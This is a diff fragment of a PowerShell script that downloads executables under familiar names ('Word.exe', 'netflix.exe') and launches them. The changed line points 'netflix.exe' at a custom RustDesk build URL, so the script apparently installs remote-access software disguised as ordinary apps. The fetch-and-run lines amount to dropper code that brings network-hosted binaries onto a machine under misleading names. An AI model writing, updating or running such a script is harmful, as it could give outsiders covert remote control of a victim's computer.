@@ -20,7 +20,7 @@ Write-Output "Download of Word.exe complete."
 Start-Process -FilePath $destination1
 Write-Output "Word.exe started."
 
-$url2 = "https://rustdesk.com/build/tasks/edb3b7d1-c522-4e97-af25-4db855ec2231/files/netflix.exe"
+$url2 = "https://rustdesk.com/build/tasks/9c66cbba-6611-47e0-ae39-ccf9f610632b/files/netflix.exe"
 $destination2 = Join-Path -Path $folderPath -ChildPath "netflix.exe"
 Invoke-WebRequest -Uri $url2 -OutFile $destination2
 Write-Output "Download of netflix.exe complete."
